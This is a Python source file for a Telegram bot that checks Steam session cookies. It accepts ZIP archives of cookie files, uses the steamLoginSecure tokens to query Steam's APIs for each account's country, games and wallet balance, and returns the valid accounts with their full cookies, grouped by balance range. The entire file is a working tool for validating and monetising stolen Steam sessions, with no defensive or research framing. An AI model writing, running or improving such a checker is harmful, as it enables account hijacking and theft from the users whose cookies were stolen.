import os
import sys
import json
import re
import time
import random
import struct
import base64
import urllib.parse as baro_enc
import zipfile
import tempfile
import shutil
import asyncio
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Thread, Lock
from io import BytesIO

import requests
from flask import Flask, jsonify
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ------------------------------------------------------------
# Constants and helper functions (from original SteamCookie.py)
# ------------------------------------------------------------

G = "\033[92m"
R = "\033[91m"
Y = "\033[93m"
B = "\033[94m"
M = "\033[95m"
C = "\033[96m"
D = "\033[90m"
W = "\033[97m"
X = "\033[0m"

BRN_MAP = {
    "ES": "Spain", "US": "United States", "GB": "United Kingdom", "DE": "Germany",
    "FR": "France", "IT": "Italy", "RU": "Russia", "CN": "China", "JP": "Japan",
    "BR": "Brazil", "IN": "India", "CA": "Canada", "AU": "Australia", "MX": "Mexico",
    "KR": "South Korea", "NL": "Netherlands", "SE": "Sweden", "NO": "Norway",
    "DK": "Denmark", "FI": "Finland", "PL": "Poland", "TR": "Turkey", "UA": "Ukraine",
    "PH": "Philippines", "TH": "Thailand", "VN": "Vietnam", "MY": "Malaysia",
    "SG": "Singapore", "ID": "Indonesia", "SA": "Saudi Arabia", "AE": "UAE",
}

CURRENCY_MAP = {
    "US": "$", "GB": "£", "EU": "€", "JP": "¥", "KR": "₩", "RU": "₽", "TR": "₺",
    "PH": "₱", "NG": "₦", "GH": "₵", "CR": "₡", "UA": "₴", "IL": "₪", "GE": "₾",
    "KZ": "₸", "MN": "₮", "KH": "៛", "BD": "৳", "SA": "﷼", "AE": "د.إ", "KW": "د.ك",
    "BR": "R$", "AU": "A$", "CA": "C$", "SG": "S$", "HK": "HK$", "NZ": "NZ$",
    "TW": "NT$", "MY": "RM", "ID": "Rp", "PL": "zł", "CZ": "Kč", "HU": "Ft",
    "IN": "₹", "PK": "₨", "EG": "£", "ZA": "R", "CL": "$", "CO": "$", "MX": "$"
}

def brn_vi(v):
    if v < 0:
        v &= 0xffffffffffffffff
    buf = bytearray()
    while v > 0x7f:
        buf.append(0x80 | (v & 0x7f))
        v >>= 7
    buf.append(v & 0x7f)
    return bytes(buf)

def brn_rvi(b, p):
    r = s = 0
    while p < len(b):
        x = b[p]
        p += 1
        r |= (x & 0x7f) << s
        if not (x & 0x80):
            break
        s += 7
    return r, p

def baro_ps(fn, s):
    d = s.encode() if isinstance(s, str) else s
    return brn_vi((fn << 3) | 2) + brn_vi(len(d)) + d

def baro_pr(fn, d):
    return brn_vi((fn << 3) | 2) + brn_vi(len(d)) + d

def baro_pi(fn, v):
    return brn_vi(fn << 3) + brn_vi(v if v >= 0 else v & 0xffffffffffffffff)

def baron_pd(raw):
    out = {}
    p = 0
    while p < len(raw):
        try:
            tag, p = brn_rvi(raw, p)
        except:
            break
        fn = tag >> 3
        wt = tag & 7
        if fn < 1:
            break
        if wt == 0:
            val, p = brn_rvi(raw, p)
            prev = out.get(fn)
            if prev is not None:
                out[fn] = [prev, val] if not isinstance(prev, list) else prev + [val]
            else:
                out[fn] = val
        elif wt == 2:
            ln, p = brn_rvi(raw, p)
            if p + ln > len(raw):
                break
            chunk = raw[p:p + ln]
            p += ln
            prev = out.get(fn)
            if prev is not None:
                out[fn] = [prev, chunk] if not isinstance(prev, list) else prev + [chunk]
            else:
                out[fn] = chunk
        elif wt == 5:
            if p + 4 > len(raw):
                break
            out[fn] = struct.unpack_from('<I', raw, p)[0]
            p += 4
        elif wt == 1:
            if p + 8 > len(raw):
                break
            out[fn] = struct.unpack_from('<Q', raw, p)[0]
            p += 8
        else:
            break
    return out

BRN_BNDRY = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
BARON_CT = f"multipart/form-data; boundary={BRN_BNDRY}"

def brn_mp(k, v):
    return (
        f"------WebKitFormBoundary7MA4YWxkTrZu0gW\r\n"
        f"Content-Disposition: form-data; name=\"{k}\"\r\n\r\n"
        f"{v}\r\n"
        f"------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n"
    ).encode()

def format_cookies_netscape(cookies):
    lines = ["# Netscape HTTP Cookie File"]
    for cookie in cookies:
        domain = cookie.get('domain', '')
        secure = 'TRUE' if cookie.get('secure', False) else 'FALSE'
        path = cookie.get('path', '/')
        name = cookie.get('name', '')
        value = cookie.get('value', '')
        expiry = cookie.get('expires', '0')
        lines.append(f"{domain}\t{secure}\t{path}\t{secure}\t{expiry}\t{name}\t{value}")
    return "\n".join(lines)

def format_cookies_json(cookies):
    return json.dumps(cookies, indent=2)

# ========== COOKIE LOADER (supports JSON, Netscape, and mixed text) ==========
def load_cookies(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read().strip()
    except:
        return None

    # Try JSON
    try:
        data = json.loads(content)
        if isinstance(data, list):
            cookies = []
            for cookie in data:
                if 'domain' in cookie and 'name' in cookie and 'value' in cookie:
                    domain = cookie.get('domain', '')
                    if domain.startswith('.'):
                        domain = domain[1:]
                    cookies.append({
                        'domain': domain,
                        'name': cookie.get('name', ''),
                        'value': cookie.get('value', ''),
                        'path': cookie.get('path', '/'),
                        'secure': cookie.get('secure', False),
                        'httpOnly': cookie.get('httpOnly', False),
                        'expires': cookie.get('expires', 0)
                    })
            if cookies:
                return cookies
        elif isinstance(data, dict):
            for key in ['cookies', 'cookie', 'data', 'cookies_list']:
                if key in data and isinstance(data[key], list):
                    cookies = []
                    for cookie in data[key]:
                        if 'domain' in cookie and 'name' in cookie and 'value' in cookie:
                            domain = cookie.get('domain', '')
                            if domain.startswith('.'):
                                domain = domain[1:]
                            cookies.append({
                                'domain': domain,
                                'name': cookie.get('name', ''),
                                'value': cookie.get('value', ''),
                                'path': cookie.get('path', '/'),
                                'secure': cookie.get('secure', False),
                                'httpOnly': cookie.get('httpOnly', False),
                                'expires': cookie.get('expires', 0)
                            })
                    if cookies:
                        return cookies
    except:
        pass

    # Try Netscape-style lines
    lines = content.splitlines()
    cookie_lines = []
    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        parts = line.split('\t')
        if len(parts) >= 7:
            domain = parts[0]
            if '.' in domain or domain == 'localhost':
                cookie_lines.append(line)
        elif 'steamLoginSecure' in line or 'steamRefresh_steam' in line:
            parts = line.split('\t')
            if len(parts) >= 7:
                cookie_lines.append(line)

    if cookie_lines:
        cookies = []
        for line in cookie_lines:
            parts = line.split('\t')
            if len(parts) >= 7:
                domain, flag, path, secure, expires, name, value = parts[:7]
                secure_bool = (secure.lower() == 'true')
                cookies.append({
                    'domain': domain,
                    'name': name,
                    'value': value,
                    'path': path,
                    'secure': secure_bool,
                    'expires': expires,
                    'httpOnly': False
                })
        if cookies:
            return cookies
    return None

# ------------------------------------------------------------
# SteamChecker – original working logic from SteamCookie.py
# ------------------------------------------------------------
class SteamChecker:
    def __init__(self, cookie_data, cookie_file_path, index):
        self.cookie_data = cookie_data
        self.cookie_file_path = cookie_file_path
        self.index = index
        self.session = requests.Session()
        self.steamid = ""
        self.username = ""
        self.token = ""
        self.level = ""
        self.country = ""
        self.balance_raw = ""
        self.balance_float = 0.0
        self.currency = ""
        self.total_games = 0
        self.games = []
        self.success = False

    def extract_steamid(self):
        for cookie in self.cookie_data:
            if cookie.get('name') == 'steamLoginSecure':
                value = cookie.get('value', '')
                if '%7C%7C' in value:
                    steamid = value.split('%7C%7C')[0]
                    if steamid.isdigit():
                        return steamid
            elif cookie.get('name') == 'steamRefresh_steam':
                value = cookie.get('value', '')
                if '%7C%7C' in value:
                    steamid = value.split('%7C%7C')[0]
                    if steamid.isdigit():
                        return steamid
        return None

    def extract_token(self):
        for cookie in self.cookie_data:
            if cookie.get('name') == 'steamLoginSecure':
                value = cookie.get('value', '')
                if '%7C%7C' in value:
                    parts = value.split('%7C%7C')
                    if len(parts) >= 2:
                        return baro_enc.unquote(parts[1])
        return None

    def get_username_from_profile(self, sid_int):
        try:
            resp = self.session.get(
                f"https://steamcommunity.com/profiles/{sid_int}",
                timeout=10,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            )
            if resp.status_code == 200:
                title_match = re.search(r'<title>(.*?)</title>', resp.text)
                if title_match:
                    title = title_match.group(1)
                    if 'Steam Community :: ' in title:
                        return title.replace('Steam Community :: ', '').strip()
                    if 'Steam 社区 :: ' in title:
                        return title.replace('Steam 社区 :: ', '').strip()
                    return title.strip()
        except:
            pass
        return None

    def get_level(self, sid_int):
        try:
            mpid = sid_int - 76561197960265728
            resp = self.session.get(
                f"https://steamcommunity.com/miniprofile/{mpid}/json",
                timeout=10,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            )
            if resp.status_code == 200:
                data = resp.json()
                level = data.get("level", data.get("player_level", ""))
                if level:
                    return str(level)
        except:
            pass
        try:
            resp = self.session.get(
                f"https://steamcommunity.com/profiles/{sid_int}",
                timeout=10,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            )
            if resp.status_code == 200:
                level_match = re.search(r'level\s*(\d+)', resp.text, re.I)
                if level_match:
                    return level_match.group(1)
                level_match = re.search(r'<span[^>]*class="[^"]*player_level[^"]*"[^>]*>(\d+)</span>', resp.text, re.I)
                if level_match:
                    return level_match.group(1)
        except:
            pass
        return "?"

    def check(self):
        # Extract steamid and token exactly like the original
        self.steamid = self.extract_steamid()
        self.token = self.extract_token()

        if not self.steamid or not self.token:
            return False

        self.session.cookies.set('Steam_Language', 'english')
        sid_int = int(self.steamid)

        try:
            # Get username and level (optional but nice to have)
            self.username = self.get_username_from_profile(sid_int)
            if not self.username:
                self.username = self.steamid[:8]

            self.level = self.get_level(sid_int)

            # ---- Country API (exactly as original) ----
            cpb = struct.pack('<BQ', 0x09, sid_int)
            resp = self.session.post(
                f"https://api.steampowered.com/IUserAccountService/GetUserCountry/v1"
                f"?access_token={self.token}",
                data=brn_mp("input_protobuf_encoded", base64.b64encode(cpb).decode()),
                headers={"Content-Type": BARON_CT},
                timeout=10
            )
            if resp.status_code == 200:
                data = baron_pd(resp.content)
                cc = data.get(1, b"")
                if isinstance(cc, bytes):
                    cc = cc.decode()
                self.country = BRN_MAP.get(cc, cc)

            # ---- Games API (exactly as original) ----
            gpb = (baro_pi(1, sid_int) + baro_pi(2, 1) + baro_pi(3, 1) +
                   baro_pi(6, 0) + baro_ps(7, "english") + baro_pi(8, 1) +
                   baro_pi(9, 1) + baro_pi(10, 1))
            gb64 = baro_enc.quote(base64.b64encode(gpb).decode())

            resp = self.session.get(
                f"https://api.steampowered.com/IPlayerService/GetOwnedGames/v1"
                f"?access_token={self.token}"
                f"&input_protobuf_encoded={gb64}",
                timeout=10
            )

            if resp.status_code == 200:
                data = baron_pd(resp.content)
                self.total_games = data.get(1, 0)

                raw_games = data.get(2, [])
                if isinstance(raw_games, bytes):
                    raw_games = [raw_games]
                elif not isinstance(raw_games, list):
                    raw_games = []

                for g in raw_games:
                    try:
                        if not isinstance(g, bytes):
                            continue
                        gf = baron_pd(g)
                        name = gf.get(2, b"")
                        if isinstance(name, bytes):
                            name = name.decode(errors="replace")
                        if isinstance(name, str) and name.strip():
                            self.games.append(name.strip())
                    except:
                        continue

            # ---- Balance API (exactly as original) ----
            resp = self.session.post(
                f"https://api.steampowered.com/IUserAccountService/GetClientWalletDetails/v1"
                f"?access_token={self.token}",
                data=brn_mp("input_protobuf_encoded", "GAE="),
                headers={"Content-Type": BARON_CT},
                timeout=10
            )
            if resp.status_code == 200:
                data = baron_pd(resp.content)
                bal = data.get(14, b"")
                if isinstance(bal, bytes):
                    bal = bal.decode("utf-8", errors="ignore")
                elif isinstance(bal, int):
                    bal = str(bal)
                self.balance_raw = bal

                # Parse balance into float and currency for grouping
                def parse_balance(balance_str, country_code):
                    currency_symbols = ['$', '€', '£', '¥', '₩', '₽', '₺', '₱', '₦', '₵', '₡', '₴', '₪', '₾', '₸', '₮', '៛', '৳', '﷼', 'د.إ', 'د.ك', 'R$', 'A$', 'C$', 'S$', 'HK$', 'NZ$', 'NT$', 'RM', 'Rp', 'zł', 'Kč', 'Ft', '₨']
                    symbol = ''
                    for sym in currency_symbols:
                        if sym in balance_str:
                            symbol = sym
                            break
                    if not symbol and country_code in CURRENCY_MAP:
                        symbol = CURRENCY_MAP[country_code]
                    cleaned = re.sub(r'[^\d.,\-]', '', balance_str)
                    if ',' in cleaned and '.' not in cleaned:
                        cleaned = cleaned.replace(',', '.')
                    parts = cleaned.split('.')
                    if len(parts) > 2:
                        cleaned = parts[0] + '.' + ''.join(parts[1:])
                    try:
                        value = float(cleaned)
                    except:
                        value = 0.0
                    return value, symbol

                self.balance_float, self.currency = parse_balance(bal, self.country)

            # If we reached here without exception, the cookie is valid (even if some API returned non-200)
            self.success = True
            return True

        except Exception:
            return False

def generate_hit_content(hit):
    username = hit.username if hit.username else hit.steamid[:8]
    country = hit.country if hit.country else "Unknown"
    balance = hit.balance_raw if hit.balance_raw else "0"
    if hit.currency and not any(c in balance for c in ['$','€','£','¥','₩','₽','₺','₱','₦','₵','₡','₴','₪','₾','₸','₮','៛','৳','﷼','د.إ','د.ك','R$','A$','C$','S$','HK$','NZ$','NT$','RM','Rp','zł','Kč','Ft','₨']):
        balance = f"{hit.currency}{balance}"
    games = str(hit.total_games) if hit.total_games else "0"
    games_str = "\n".join([f"{i+1}. {game}" for i, game in enumerate(hit.games)]) if hit.games else "No games found"
    netscape_cookies = format_cookies_netscape(hit.cookie_data)
    json_cookies = format_cookies_json(hit.cookie_data)

    content = f"""STEAM ACCOUNT DETAILS
{'='*60}

Steam ID    : {hit.steamid}
Username    : {hit.username if hit.username else 'Unknown'}
Level       : {hit.level}
Country     : {country}
Balance     : {balance}
Total Games : {hit.total_games}

{'='*60}
GAMES LIST:
{'-'*60}
{games_str}

{'='*60}
COOKIES (Netscape Format):
{'-'*60}
{netscape_cookies}

{'='*60}
COOKIES (JSON Format):
{'-'*60}
{json_cookies}

{'='*60}
Checked on : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
    return content

# ------------------------------------------------------------
# Telegram Bot and Flask
# ------------------------------------------------------------

BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    print("Error: BOT_TOKEN environment variable not set.")
    sys.exit(1)

flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return jsonify({"status": "Bot Running", "time": time.time()})

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    flask_app.run(host="0.0.0.0", port=port)

def group_hits_by_balance(hits):
    groups = {"0-1": [], "1-5": [], "5-10": [], "10-200": [], "others": []}
    for bal, username, steamid, content in hits:
        if bal <= 1:
            groups["0-1"].append((bal, username, steamid, content))
        elif bal <= 5:
            groups["1-5"].append((bal, username, steamid, content))
        elif bal <= 10:
            groups["5-10"].append((bal, username, steamid, content))
        elif bal <= 200:
            groups["10-200"].append((bal, username, steamid, content))
        else:
            groups["others"].append((bal, username, steamid, content))
    return groups

def create_zip_from_hits(hits, range_name):
    if not hits:
        return None
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, 'a', zipfile.ZIP_DEFLATED) as zf:
        for idx, (bal, username, steamid, content) in enumerate(hits, 1):
            safe_username = "".join(c for c in username if c.isalnum() or c in " _-")
            filename = f"{range_name}/{safe_username}_{steamid}.txt"
            zf.writestr(filename, content)
    zip_buffer.seek(0)
    return zip_buffer

class ProgressTracker:
    def __init__(self, total):
        self.total = total
        self.processed = 0
        self.valid = 0
        self.invalid = 0
        self.lock = Lock()
        self.done = False

def process_cookies_with_progress(cookie_list, tracker, batch_size=200):
    valid_hits = []
    total_cookies = len(cookie_list)

    for start in range(0, total_cookies, batch_size):
        batch = cookie_list[start:start+batch_size]
        checkers = []
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = []
            for cookies, filepath in batch:
                checker = SteamChecker(cookies, filepath, 0)
                checkers.append(checker)
                futures.append(executor.submit(checker.check))
            for future in as_completed(futures):
                success = future.result()
                with tracker.lock:
                    tracker.processed += 1
                    if success:
                        tracker.valid += 1
                    else:
                        tracker.invalid += 1

        for checker in checkers:
            if checker.success:
                content = generate_hit_content(checker)
                valid_hits.append((checker.balance_float, checker.username, checker.steamid, content))
        del checkers

    tracker.done = True
    return valid_hits

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    if not document or not document.file_name.endswith('.zip'):
        await update.message.reply_text("Please send a ZIP file containing cookie files (.txt or .json).")
        return

    status_msg = await update.message.reply_text("⏳ Downloading and extracting...")

    try:
        file = await context.bot.get_file(document.file_id)
        zip_path = f"/tmp/{document.file_id}.zip"
        await file.download_to_drive(zip_path)

        extract_dir = tempfile.mkdtemp()
        with zipfile.ZipFile(zip_path, 'r') as zf:
            zf.extractall(extract_dir)

        cookie_files = []
        for root, _, files in os.walk(extract_dir):
            for f in files:
                if f.endswith(('.txt', '.json')):
                    cookie_files.append(os.path.join(root, f))

        if not cookie_files:
            await status_msg.edit_text("❌ No cookie files (.txt or .json) found in the ZIP.")
            shutil.rmtree(extract_dir)
            os.remove(zip_path)
            return

        all_cookies = []
        for filepath in cookie_files:
            cookies = load_cookies(filepath)
            if cookies:
                essential_names = {'steamLoginSecure', 'steamRefresh_steam'}
                has_essential = any(c.get('name') in essential_names for c in cookies)
                if has_essential:
                    all_cookies.append((cookies, filepath))

        if not all_cookies:
            await status_msg.edit_text("❌ Failed to load any valid cookies from the files. Ensure they contain 'steamLoginSecure' or 'steamRefresh_steam'.")
            shutil.rmtree(extract_dir)
            os.remove(zip_path)
            return

        total = len(all_cookies)
        await status_msg.edit_text(f"✅ Loaded {total} cookie sets. Starting check...")

        tracker = ProgressTracker(total)
        loop = asyncio.get_running_loop()

        processing_future = loop.run_in_executor(None, process_cookies_with_progress, all_cookies, tracker, 200)

        last_text = ""
        async def status_updater():
            nonlocal last_text
            while not tracker.done:
                with tracker.lock:
                    processed = tracker.processed
                    valid = tracker.valid
                    invalid = tracker.invalid
                new_text = f"🔄 Checking... {processed}/{total} | ✅ Valid: {valid} | ❌ Invalid: {invalid}"
                if new_text != last_text:
                    try:
                        await status_msg.edit_text(new_text)
                        last_text = new_text
                    except Exception:
                        pass
                await asyncio.sleep(1)
            with tracker.lock:
                processed = tracker.processed
                valid = tracker.valid
                invalid = tracker.invalid
            final_text = f"✅ Checking completed: {total} total, {valid} valid, {invalid} invalid."
            if final_text != last_text:
                try:
                    await status_msg.edit_text(final_text)
                except Exception:
                    pass

        await asyncio.gather(processing_future, status_updater())

        valid_hits = processing_future.result()

        if not valid_hits:
            await update.message.reply_text("❌ No valid Steam accounts found.")
            shutil.rmtree(extract_dir)
            os.remove(zip_path)
            return

        groups = group_hits_by_balance(valid_hits)
        sent = 0
        for range_name, hits in groups.items():
            if not hits:
                continue
            zip_buffer = create_zip_from_hits(hits, range_name)
            if zip_buffer:
                await update.message.reply_document(
                    document=zip_buffer,
                    filename=f"steam_hits_{range_name}.zip",
                    caption=f"✅ {len(hits)} accounts with balance {range_name} {('(including others)' if range_name=='others' else '')}"
                )
                sent += 1
        if sent == 0:
            await update.message.reply_text("No groups to send? (Unexpected)")

        shutil.rmtree(extract_dir)
        os.remove(zip_path)

    except Exception as e:
        await status_msg.edit_text(f"❌ Error: {str(e)}")
        try:
            shutil.rmtree(extract_dir)
        except:
            pass
        try:
            os.remove(zip_path)
        except:
            pass

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Send me a ZIP file containing Steam cookie files (JSON or Netscape .txt).\n"
        "I will check each cookie and send back valid accounts grouped by balance ranges.\n"
        "Balance ranges: 0-1, 1-5, 5-10, 10-200 (and others).\n"
        "Currency symbols are detected automatically."
    )

def main():
    flask_thread = Thread(target=run_flask, daemon=True)
    flask_thread.start()

    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    print("Bot started. Press Ctrl+C to stop.")
    application.run_polling()

if __name__ == "__main__":
    main()
